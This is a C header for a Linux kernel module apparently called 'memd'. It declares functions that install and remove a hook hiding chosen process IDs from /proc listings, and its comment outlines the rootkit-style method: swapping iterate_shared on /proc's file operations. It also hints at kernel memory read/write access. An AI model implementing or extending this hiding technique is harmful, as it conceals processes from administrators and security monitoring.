#ifndef MEMD_SYSHOOK_H
#define MEMD_SYSHOOK_H

/* VFS iterate_shared hook hiding (no kernel-text writes, ever).
 *
 * Install is explicit via ioctl (userspace gates on CFI status first:
 * on enforcing kernels install is refused by policy, not attempted).
 * The hook swaps iterate_shared on the live /proc file_operations
 * reached via filp_open; filldir skips hidden pids. Anything
 * unresolved -> explicit NO-GO, feature stays inactive, the module
 * still serves R/W (hiding is never load-bearing).
 *
 * rmmod always restores the original entry first (dangling pointer
 * after unload would panic the next /proc readdir).
 */
int memd_hide_install(void);
int memd_hide_uninstall(void);
int memd_hide_active(void);

#endif /* MEMD_SYSHOOK_H */
